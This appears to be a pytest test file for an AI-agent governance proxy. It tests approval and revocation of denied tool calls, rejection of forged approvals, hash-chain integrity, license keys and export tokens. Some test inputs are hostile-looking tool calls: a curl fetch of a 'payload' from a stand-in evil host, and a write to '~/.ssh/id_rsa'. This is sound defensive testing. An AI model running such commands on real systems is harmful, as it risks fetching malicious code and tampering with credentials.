"""Gate 1D — Approval store and export authorization tests.

Dispatch: 174-D-2026-0430 (RELEASE-G1D-APPROVAL-EXPORT-AUTH-TESTS)

Covers:
  1. Approval override of DENY (G-05) — full mediation pipeline
  2. Stale approval detection (G-18)
  3. Forged approval rejection
  4. Approval chain recording verification
  5. License-key validation for export auth
  6. Export event chain recording depth
  7. Token lifecycle edge cases
"""

import hashlib
import importlib.util
import json
import os
import secrets
import sys
import tempfile
from datetime import datetime, timezone, timedelta
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
for p in (REPO / "proxy", REPO / "scripts", REPO / "mcp"):
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))

from approval_store import (
    ApprovalStore,
    load_approval_store_from_events,
    load_approval_store_from_chain,
    _verify_event_signature,
)
from event_model import build_non_action_event, sign_non_action_event
from proxy.server import mediate_decision, ChainRecorder, _check_approval

# Load dashboard server for export token tests
_dashboard_spec = importlib.util.spec_from_file_location(
    "dashboard_server_under_test",
    REPO / "dashboard" / "server.py",
)
dashboard_server = importlib.util.module_from_spec(_dashboard_spec)
assert _dashboard_spec.loader is not None
_dashboard_spec.loader.exec_module(dashboard_server)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def ed25519_keypair():
    """Generate a fresh Ed25519 keypair for testing."""
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    from cryptography.hazmat.primitives import serialization
    priv = Ed25519PrivateKey.generate()
    pub = priv.public_key()
    raw = pub.public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
    key_id = "ed25519:" + hashlib.sha256(raw).hexdigest()
    return priv, pub, key_id


def _load_policy():
    """Load the production policy rules."""
    policy_path = REPO / "capabilities" / "policy-rules.json"
    return json.loads(policy_path.read_text(encoding="utf-8"))


def _make_approval(artifact_identity, operator="test-operator",
                   family="mcp_tools_v1", context="default",
                   version="baseline-v1"):
    """Build an approval event matching the default scope."""
    return build_non_action_event(
        "opaque_artifact_approval",
        {
            "artifact_identity": artifact_identity,
            "approving_operator": operator,
            "governed_family": family,
            "deployment_context": context,
            "policy_version": version,
        },
    )


def _make_revocation(artifact_identity, operator="test-operator",
                     family="mcp_tools_v1", context="default",
                     version="baseline-v1"):
    """Build a revocation event matching the default scope."""
    return build_non_action_event(
        "opaque_artifact_revocation",
        {
            "artifact_identity": artifact_identity,
            "revoking_operator": operator,
            "governed_family": family,
            "deployment_context": context,
            "policy_version": version,
        },
    )


# ===========================================================================
# Scope 1 — Approval override of DENY (G-05)
# ===========================================================================

class TestApprovalOverrideDeny:
    """Full mediation pipeline: DENY → approve → ALLOW → revoke → DENY."""

    def test_deny_then_approve_then_allow(self, tmp_path, monkeypatch):
        """An action DENIED by policy becomes ALLOW when approved."""
        monkeypatch.setenv("GOV_GOVERNED_FAMILY", "mcp_tools_v1")
        monkeypatch.setenv("GOV_DEPLOYMENT_CONTEXT", "default")
        monkeypatch.setenv("GOV_POLICY_VERSION", "baseline-v1")

        policy = _load_policy()
        chain = tmp_path / "decision-chain.jsonl"
        recorder = ChainRecorder(chain)

        # Step 1: Mediate a network action — should be DENIED by network-deny
        result1 = mediate_decision(
            "Bash",
            {"command": "curl https://evil.example.com/payload"},
            policy=policy,
            chain_recorder=recorder,
        )
        assert result1["policy_decision"] == "DENY"
        assert "network" in result1.get("matched_rule", "")

        # Step 2: Create approval for the tool name
        store = ApprovalStore()
        approval_event = _make_approval("Bash")
        store.ingest_approval(approval_event)

        # Step 3: Re-mediate with approval store — should be ALLOW
        result2 = mediate_decision(
            "Bash",
            {"command": "curl https://evil.example.com/payload"},
            policy=policy,
            chain_recorder=recorder,
            approval_store=store,
        )
        assert result2["policy_decision"] == "ALLOW"
        assert result2["matched_rule"] == "approved_lookup"
        assert result2["approval_event_id"] == approval_event["event_id"]

    def test_approve_then_revoke_then_deny(self, tmp_path, monkeypatch):
        """After revoking approval, the action reverts to DENY."""
        monkeypatch.setenv("GOV_GOVERNED_FAMILY", "mcp_tools_v1")
        monkeypatch.setenv("GOV_DEPLOYMENT_CONTEXT", "default")
        monkeypatch.setenv("GOV_POLICY_VERSION", "baseline-v1")

        policy = _load_policy()
        chain = tmp_path / "decision-chain.jsonl"
        recorder = ChainRecorder(chain)
        store = ApprovalStore()

        # Approve, then mediate — should ALLOW
        store.ingest_approval(_make_approval("Bash"))
        result1 = mediate_decision(
            "Bash",
            {"command": "curl https://evil.example.com/payload"},
            policy=policy,
            chain_recorder=recorder,
            approval_store=store,
        )
        assert result1["policy_decision"] == "ALLOW"

        # Revoke
        store.ingest_revocation(_make_revocation("Bash"))

        # Re-mediate — should revert to DENY
        result2 = mediate_decision(
            "Bash",
            {"command": "curl https://evil.example.com/payload"},
            policy=policy,
            chain_recorder=recorder,
            approval_store=store,
        )
        assert result2["policy_decision"] == "DENY"

    def test_approval_by_target_path(self, tmp_path, monkeypatch):
        """Approval on a target path (not just tool name) also overrides DENY."""
        monkeypatch.setenv("GOV_GOVERNED_FAMILY", "mcp_tools_v1")
        monkeypatch.setenv("GOV_DEPLOYMENT_CONTEXT", "default")
        monkeypatch.setenv("GOV_POLICY_VERSION", "baseline-v1")

        policy = _load_policy()
        chain = tmp_path / "decision-chain.jsonl"
        recorder = ChainRecorder(chain)

        # A sensitive path write should be DENIED
        result1 = mediate_decision(
            "Write",
            {"file_path": "~/.ssh/id_rsa", "content": "fake-key"},
            policy=policy,
            chain_recorder=recorder,
        )
        assert result1["policy_decision"] == "DENY"

        # Approve the target path
        store = ApprovalStore()
        store.ingest_approval(_make_approval("~/.ssh/id_rsa"))

        result2 = mediate_decision(
            "Write",
            {"file_path": "~/.ssh/id_rsa", "content": "fake-key"},
            policy=policy,
            chain_recorder=recorder,
            approval_store=store,
        )
        assert result2["policy_decision"] == "ALLOW"
        assert result2["matched_rule"] == "approved_lookup"

    def test_full_cycle_recorded_in_chain(self, tmp_path, monkeypatch):
        """DENY → ALLOW → DENY cycle produces 3 chain records with correct decisions."""
        monkeypatch.setenv("GOV_GOVERNED_FAMILY", "mcp_tools_v1")
        monkeypatch.setenv("GOV_DEPLOYMENT_CONTEXT", "default")
        monkeypatch.setenv("GOV_POLICY_VERSION", "baseline-v1")

        policy = _load_policy()
        chain = tmp_path / "decision-chain.jsonl"
        recorder = ChainRecorder(chain)
        store = ApprovalStore()

        # DENY
        mediate_decision("Bash", {"command": "curl https://x.com"},
                         policy=policy, chain_recorder=recorder)
        # Approve → ALLOW
        store.ingest_approval(_make_approval("Bash"))
        mediate_decision("Bash", {"command": "curl https://x.com"},
                         policy=policy, chain_recorder=recorder,
                         approval_store=store)
        # Revoke → DENY
        store.ingest_revocation(_make_revocation("Bash"))
        mediate_decision("Bash", {"command": "curl https://x.com"},
                         policy=policy, chain_recorder=recorder,
                         approval_store=store)

        lines = [l for l in chain.read_text(encoding="utf-8").splitlines() if l.strip()]
        assert len(lines) == 3
        decisions = [json.loads(l)["policy_decision"] for l in lines]
        assert decisions == ["DENY", "ALLOW", "DENY"]


# ===========================================================================
# Scope 2 — Stale approval detection (G-18)
# ===========================================================================

class TestStaleApprovalDetection:
    """Document that the approval store has no built-in staleness mechanism."""

    def test_approvals_persist_indefinitely(self, monkeypatch):
        """Approvals remain active until explicitly revoked.

        DOCUMENTED LIMITATION: The approval store (approval_store.py) does not
        implement time-based staleness or expiry windows. An approval remains
        active indefinitely until a matching revocation event is ingested.

        This is by design for the current release: approvals are scoped by
        policy_version (spec §9.4), so a policy version change effectively
        invalidates all prior approvals for the new version. However, within
        a policy version, there is no automatic expiry.
        """
        store = ApprovalStore()
        approval = _make_approval("sha256:test-artifact")
        store.ingest_approval(approval)

        # Approval persists — no time-based expiry
        result = store.lookup(
            "sha256:test-artifact", "mcp_tools_v1", "default", "baseline-v1"
        )
        assert result is not None
        assert result["artifact_identity"] == "sha256:test-artifact"

    def test_policy_version_change_invalidates_approvals(self, monkeypatch):
        """Changing policy_version effectively invalidates prior approvals.

        This is the current mechanism that limits approval staleness: when
        the policy version changes, approvals scoped to the old version
        no longer match.
        """
        store = ApprovalStore()
        store.ingest_approval(_make_approval(
            "sha256:artifact", version="baseline-v1"
        ))

        # Lookup with old version succeeds
        assert store.lookup(
            "sha256:artifact", "mcp_tools_v1", "default", "baseline-v1"
        ) is not None

        # Lookup with new version fails (scope mismatch)
        assert store.lookup(
            "sha256:artifact", "mcp_tools_v1", "default", "baseline-v2"
        ) is None

    def test_stale_approval_not_overriding_deny_after_revocation(self, tmp_path, monkeypatch):
        """After revocation, the approval no longer overrides DENY."""
        monkeypatch.setenv("GOV_GOVERNED_FAMILY", "mcp_tools_v1")
        monkeypatch.setenv("GOV_DEPLOYMENT_CONTEXT", "default")
        monkeypatch.setenv("GOV_POLICY_VERSION", "baseline-v1")

        policy = _load_policy()
        store = ApprovalStore()

        store.ingest_approval(_make_approval("Bash"))
        store.ingest_revocation(_make_revocation("Bash"))

        result = mediate_decision(
            "Bash",
            {"command": "curl https://evil.com"},
            policy=policy,
            approval_store=store,
        )
        assert result["policy_decision"] == "DENY"


# ===========================================================================
# Scope 3 — Forged approval rejection
# ===========================================================================

class TestForgedApprovalRejection:
    """Test forged approval detection within the current identity model."""

    def test_tampered_signature_rejected(self, ed25519_keypair):
        """Approval with tampered signature is rejected when signatures required."""
        priv, pub, key_id = ed25519_keypair
        store = ApprovalStore(require_signatures=True, public_key=pub)

        event = build_non_action_event(
            "opaque_artifact_approval",
            {
                "artifact_identity": "sha256:forged",
                "approving_operator": "attacker",
                "governed_family": "mcp_tools_v1",
                "deployment_context": "default",
                "policy_version": "baseline-v1",
            },
            signing_key=priv,
            signing_key_id=key_id,
        )
        # Tamper after signing
        event["approving_operator"] = "evil-operator"

        accepted = store.ingest_approval(event)
        assert accepted is False
        assert store.rejected_count == 1
        assert len(store.all_approvals()) == 0

    def test_unsigned_event_rejected_when_required(self, ed25519_keypair):
        """Unsigned approval rejected when require_signatures=True."""
        _, pub, _ = ed25519_keypair
        store = ApprovalStore(require_signatures=True, public_key=pub)

        event = _make_approval("sha256:sneaky")  # unsigned
        accepted = store.ingest_approval(event)
        assert accepted is False
        assert store.rejected_count == 1

    def test_direct_file_injection_accepted_without_signatures(self, tmp_path):
        """Approval injected directly into chain file is accepted when
        signatures are not required.

        DOCUMENTED LIMITATION / ACCEPTED DEFERRAL: In the current release,
        operator identity is unverified (accepted deferral). Without
        require_signatures=True, any correctly-formatted approval event
        written to the chain file will be ingested by
        load_approval_store_from_chain(). This is mitigated by:

        1. The governance chain is protected by hash linkage — injecting
           a record breaks the chain, detectable by integrity verification.
        2. Chain files have restricted file permissions.
        3. Future releases may enforce signature verification by default.

        The test below demonstrates that a correctly-formatted but
        unsigned approval IS accepted when loaded from the chain file,
        documenting the current behavior for the release.
        """
        chain = tmp_path / "decision-chain.jsonl"
        # Write a properly-formatted approval event directly to the chain
        injected = build_non_action_event(
            "opaque_artifact_approval",
            {
                "artifact_identity": "sha256:injected",
                "approving_operator": "attacker@evil.com",
                "governed_family": "mcp_tools_v1",
                "deployment_context": "default",
                "policy_version": "baseline-v1",
            },
        )
        chain.write_text(
            json.dumps(injected, sort_keys=True, separators=(",", ":")) + "\n",
            encoding="utf-8",
        )

        # Without signature verification, the injected approval is accepted
        store = load_approval_store_from_chain(str(chain))
        assert len(store.all_approvals()) == 1

        # WITH signature verification, it would be rejected
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from cryptography.hazmat.primitives import serialization
        priv = Ed25519PrivateKey.generate()
        pub = priv.public_key()
        store_strict = load_approval_store_from_chain(
            str(chain), require_signatures=True, public_key=pub,
        )
        assert len(store_strict.all_approvals()) == 0
        assert store_strict.rejected_count == 1

    def test_forged_event_detectable_by_chain_integrity(self, tmp_path):
        """Injecting a record into the chain breaks hash linkage."""
        chain = tmp_path / "decision-chain.jsonl"
        from readout import check_chain_integrity

        # Write a valid 2-record chain
        e1 = build_non_action_event(
            "usage_attestation", {"attestation_type": "test", "attestation_scope": "unit"},
        )
        e2 = build_non_action_event(
            "usage_attestation", {"attestation_type": "test", "attestation_scope": "unit2"},
            prev_record_hash=e1["record_hash"],
        )
        with chain.open("w", encoding="utf-8") as fh:
            fh.write(json.dumps(e1, sort_keys=True, separators=(",", ":")) + "\n")
            fh.write(json.dumps(e2, sort_keys=True, separators=(",", ":")) + "\n")

        # Inject an approval between records (breaks linkage)
        lines = chain.read_text(encoding="utf-8").splitlines()
        injected = build_non_action_event(
            "opaque_artifact_approval",
            {
                "artifact_identity": "sha256:forged",
                "approving_operator": "attacker",
                "governed_family": "mcp_tools_v1",
                "deployment_context": "default",
                "policy_version": "baseline-v1",
            },
            prev_record_hash=e1["record_hash"],
        )
        lines.insert(1, json.dumps(injected, sort_keys=True, separators=(",", ":")))
        chain.write_text("\n".join(lines) + "\n", encoding="utf-8")

        result = check_chain_integrity(chain)
        assert result["status"] == "broken"
        assert result["break_count"] >= 1


# ===========================================================================
# Scope 4 — Approval chain recording verification
# ===========================================================================

class TestApprovalChainRecording:
    """Verify approval/revocation mutations produce chain events with correct content."""

    def test_approval_records_chain_event(self, tmp_path):
        """Adding an approval records an opaque_artifact_approval event."""
        chain = tmp_path / "decision-chain.jsonl"
        recorder = ChainRecorder(chain)

        approval = _make_approval("sha256:test-target")
        # The approval event is a non-action event — write it via recorder
        recorder.append_integrity_event(
            "opaque_artifact_approval",
            {
                "artifact_identity": "sha256:test-target",
                "approving_operator": "greg@example.com",
                "governed_family": "mcp_tools_v1",
                "deployment_context": "default",
                "policy_version": "baseline-v1",
            },
        )

        lines = [l for l in chain.read_text(encoding="utf-8").splitlines() if l.strip()]
        assert len(lines) == 1
        stored = json.loads(lines[0])
        assert stored["event_type"] == "opaque_artifact_approval"
        assert stored["artifact_identity"] == "sha256:test-target"
        assert stored["approving_operator"] == "greg@example.com"
        assert stored["governed_family"] == "mcp_tools_v1"
        assert stored["record_hash"].startswith("sha256:")

    def test_revocation_records_chain_event(self, tmp_path):
        """Revoking an approval records an opaque_artifact_revocation event."""
        chain = tmp_path / "decision-chain.jsonl"
        recorder = ChainRecorder(chain)

        recorder.append_integrity_event(
            "opaque_artifact_revocation",
            {
                "artifact_identity": "sha256:test-target",
                "revoking_operator": "greg@example.com",
                "governed_family": "mcp_tools_v1",
                "deployment_context": "default",
                "policy_version": "baseline-v1",
            },
        )

        lines = [l for l in chain.read_text(encoding="utf-8").splitlines() if l.strip()]
        assert len(lines) == 1
        stored = json.loads(lines[0])
        assert stored["event_type"] == "opaque_artifact_revocation"
        assert stored["artifact_identity"] == "sha256:test-target"
        assert stored["revoking_operator"] == "greg@example.com"

    def test_approval_event_has_hash_linkage(self, tmp_path):
        """Approval and revocation events are hash-linked in the chain."""
        chain = tmp_path / "decision-chain.jsonl"
        recorder = ChainRecorder(chain)

        recorder.append_integrity_event(
            "opaque_artifact_approval",
            {
                "artifact_identity": "sha256:linked",
                "approving_operator": "op1",
                "governed_family": "mcp_tools_v1",
                "deployment_context": "default",
                "policy_version": "baseline-v1",
            },
        )
        recorder.append_integrity_event(
            "opaque_artifact_revocation",
            {
                "artifact_identity": "sha256:linked",
                "revoking_operator": "op1",
                "governed_family": "mcp_tools_v1",
                "deployment_context": "default",
                "policy_version": "baseline-v1",
            },
        )

        lines = [l for l in chain.read_text(encoding="utf-8").splitlines() if l.strip()]
        assert len(lines) == 2
        first = json.loads(lines[0])
        second = json.loads(lines[1])
        assert second["prev_record_hash"] == first["record_hash"]

    def test_chain_integrity_after_approval_revocation(self, tmp_path):
        """Chain passes integrity check after approval + revocation events."""
        from readout import check_chain_integrity

        chain = tmp_path / "decision-chain.jsonl"
        recorder = ChainRecorder(chain)

        recorder.append_integrity_event(
            "opaque_artifact_approval",
            {
                "artifact_identity": "sha256:integrity-test",
                "approving_operator": "op",
                "governed_family": "f1",
                "deployment_context": "d1",
                "policy_version": "v1",
            },
        )
        recorder.append_integrity_event(
            "opaque_artifact_revocation",
            {
                "artifact_identity": "sha256:integrity-test",
                "revoking_operator": "op",
                "governed_family": "f1",
                "deployment_context": "d1",
                "policy_version": "v1",
            },
        )

        result = check_chain_integrity(chain)
        assert result["status"] == "ok"
        assert result["chain_event_count"] == 2


# ===========================================================================
# Scope 5 — License-key validation for export auth
# ===========================================================================

class TestLicenseKeyValidation:
    """Verify license key validation gates export token creation."""

    @pytest.fixture(autouse=True)
    def _setup_test_keypair(self, tmp_path, monkeypatch):
        """Set up a test Ed25519 keypair for license signing/verification."""
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from cryptography.hazmat.primitives import serialization

        priv = Ed25519PrivateKey.generate()
        pub = priv.public_key()
        pub_hex = pub.public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw
        ).hex()
        monkeypatch.setenv("GOV_LICENSE_VERIFY_KEY_HEX", pub_hex)

        key_file = tmp_path / "test-license-key.pem"
        key_file.write_bytes(priv.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        ))
        monkeypatch.setenv("GOV_LICENSE_SIGNING_KEY_PATH", str(key_file))

        # Monkeypatch the module-level verify key (cleaned up automatically)
        import licensing
        monkeypatch.setattr(licensing, "_DEFAULT_VERIFY_KEY_HEX", pub_hex)
        self._licensing = licensing

    def test_valid_license_key_accepted(self):
        """Valid license key produces decoded fields."""
        token = self._licensing.generate_license_token(
            "team", "20271231", org="test-org"
        )
        result = self._licensing.validate_license_key(token)
        assert result is not None
        assert result["tier"] == "team"
        assert result["organization"] == "test-org"

    def test_invalid_license_key_rejected(self):
        """Random string is rejected as invalid license key."""
        result = self._licensing.validate_license_key("not-a-valid-license-key")
        assert result is None

    def test_missing_license_key_rejected(self):
        """Empty string is rejected."""
        result = self._licensing.validate_license_key("")
        assert result is None

    def test_expired_license_key_detected(self, tmp_path):
        """License with past expiry date transitions to personal posture."""
        token = self._licensing.generate_license_token(
            "team", "20200101", org="expired-org"  # already expired
        )
        # Token itself is still cryptographically valid
        result = self._licensing.validate_license_key(token)
        assert result is not None
        assert result["expiry_date"] == "20200101"

        # But posture resolution shows it as expired/personal
        activation = self._licensing.activate_license(tmp_path, token)
        assert activation["ok"] is True
        posture = self._licensing.resolve_posture(tmp_path, unique_user_count=2)
        assert posture["license_status"] == "personal"
        assert posture["license_tier"] == "personal"


# ===========================================================================
# Scope 6 — Export event chain recording depth
# ===========================================================================

class TestExportEventRecording:
    """Verify export chain events contain detailed fields."""

    def test_event_includes_surface_type(self, tmp_path, monkeypatch):
        """chain_export_created event includes the surface type."""
        chain = tmp_path / "decision-chain.jsonl"
        monkeypatch.setattr(dashboard_server, "CHAIN", chain)

        event = dashboard_server._record_export_event({
            "surface": "audit",
            "format": "json",
        })
        assert event["event_type"] == "chain_export_created"
        assert event["surface"] == "audit"

    def test_event_includes_token_scope(self, tmp_path, monkeypatch):
        """Event includes chain_source and range scope."""
        chain = tmp_path / "decision-chain.jsonl"
        monkeypatch.setattr(dashboard_server, "CHAIN", chain)

        event = dashboard_server._record_export_event({
            "surface": "activity",
            "chain_source": "archive",
            "archive_id": "chain-archive-20260430",
            "range_start_sequence": 1,
            "range_end_sequence": 50,
        })
        assert event["chain_source"] == "archive"
        assert event["archive_id"] == "chain-archive-20260430"

    def test_event_includes_operator_identity(self, tmp_path, monkeypatch):
        """Event includes the operator identity (license fingerprint)."""
        chain = tmp_path / "decision-chain.jsonl"
        monkeypatch.setattr(dashboard_server, "CHAIN", chain)

        event = dashboard_server._record_export_event({
            "surface": "audit",
            "operator_identity": "license_sha256:abc123def456",
        })
        assert event["operator_identity"] == "license_sha256:abc123def456"

    def test_evidence_package_event_includes_metadata(self, tmp_path, monkeypatch):
        """encrypted_evidence_package_created event includes package metadata."""
        chain = tmp_path / "decision-chain.jsonl"
        monkeypatch.setattr(dashboard_server, "CHAIN", chain)

        event = dashboard_server._record_export_event({
            "surface": "evidence_package",
            "format": "encrypted_zip",
            "operator_identity": "license_sha256:test",
            "record_count": 42,
            "password_recorded": False,
            "chain_source": "live",
            "filters": {"policy_decision": "DENY"},
        })
        assert event["surface"] == "evidence_package"
        assert event["record_count"] == 42
        assert event["password_recorded"] is False
        assert event["filters"]["policy_decision"] == "DENY"

    def test_event_stored_in_chain_with_hash(self, tmp_path, monkeypatch):
        """Export event is stored in the chain file with a valid record_hash."""
        chain = tmp_path / "decision-chain.jsonl"
        monkeypatch.setattr(dashboard_server, "CHAIN", chain)

        dashboard_server._record_export_event({
            "surface": "audit",
            "format": "json",
        })

        stored = json.loads(chain.read_text(encoding="utf-8").strip())
        assert stored["record_hash"].startswith("sha256:")
        assert stored["event_type"] == "chain_export_created"


# ===========================================================================
# Scope 7 — Token lifecycle edge cases
# ===========================================================================

class TestTokenLifecycleEdgeCases:
    """Test export token edge cases: expiry boundary, multi-surface, unused."""

    def test_token_at_exact_expiry_boundary_rejected(self, monkeypatch):
        """Token at exactly expires_at is rejected (consistent <= check)."""
        now = 1000.0
        monkeypatch.setattr(dashboard_server._time_mod, "time", lambda: now)
        token_data = dashboard_server._issue_export_token({
            "surface": "audit",
        })
        token = token_data["token"]

        # At exactly expires_at: float(expires_at) <= now → rejected
        expiry = token_data["expires_at"]
        monkeypatch.setattr(dashboard_server._time_mod, "time", lambda: expiry)
        result = dashboard_server._validate_export_token(token, surface="audit")
        assert result is None  # Rejected at exact boundary

    def test_token_just_before_expiry_accepted(self, monkeypatch):
        """Token one second before expiry is accepted."""
        now = 1000.0
        monkeypatch.setattr(dashboard_server._time_mod, "time", lambda: now)
        token_data = dashboard_server._issue_export_token({
            "surface": "audit",
        })
        token = token_data["token"]

        # One second before expiry — should still be valid
        monkeypatch.setattr(
            dashboard_server._time_mod, "time",
            lambda: token_data["expires_at"] - 1,
        )
        result = dashboard_server._validate_export_token(token, surface="audit")
        assert result is not None

    def test_multiple_tokens_independently_scoped(self, monkeypatch):
        """Tokens for different surfaces cannot be substituted."""
        now = 1000.0
        monkeypatch.setattr(dashboard_server._time_mod, "time", lambda: now)

        audit_token = dashboard_server._issue_export_token({"surface": "audit"})
        activity_token = dashboard_server._issue_export_token({"surface": "activity"})

        # Each token works for its own surface
        assert dashboard_server._validate_export_token(
            audit_token["token"], surface="audit"
        ) is not None
        assert dashboard_server._validate_export_token(
            activity_token["token"], surface="activity"
        ) is not None

        # Cross-surface substitution rejected
        assert dashboard_server._validate_export_token(
            audit_token["token"], surface="activity"
        ) is None
        assert dashboard_server._validate_export_token(
            activity_token["token"], surface="audit"
        ) is None

    def test_unused_token_expires_no_side_effects(self, monkeypatch):
        """Token created but never used has no side effects after expiry."""
        now = 1000.0
        monkeypatch.setattr(dashboard_server._time_mod, "time", lambda: now)

        token_data = dashboard_server._issue_export_token({"surface": "audit"})
        token = token_data["token"]

        # Advance past expiry — never used
        monkeypatch.setattr(
            dashboard_server._time_mod, "time",
            lambda: now + dashboard_server.EXPORT_TOKEN_TTL_SECONDS + 60,
        )

        # Token is expired
        assert dashboard_server._validate_export_token(token, surface="audit") is None

        # Clean triggers — token removed from store
        dashboard_server._clean_export_tokens()
        with dashboard_server._export_tokens_lock:
            assert token not in dashboard_server._export_tokens

    def test_token_with_archive_scope_binding(self, monkeypatch):
        """Token scoped to specific archive rejects different archive."""
        now = 1000.0
        monkeypatch.setattr(dashboard_server._time_mod, "time", lambda: now)

        token_data = dashboard_server._issue_export_token({
            "surface": "audit",
            "chain_source": "archive",
            "archive_id": "chain-archive-abc",
        })
        token = token_data["token"]

        # Correct archive accepted
        assert dashboard_server._validate_export_token(
            token, surface="audit", chain_source="archive",
            archive_id="chain-archive-abc",
        ) is not None

        # Different archive rejected
        assert dashboard_server._validate_export_token(
            token, surface="audit", chain_source="archive",
            archive_id="chain-archive-xyz",
        ) is None
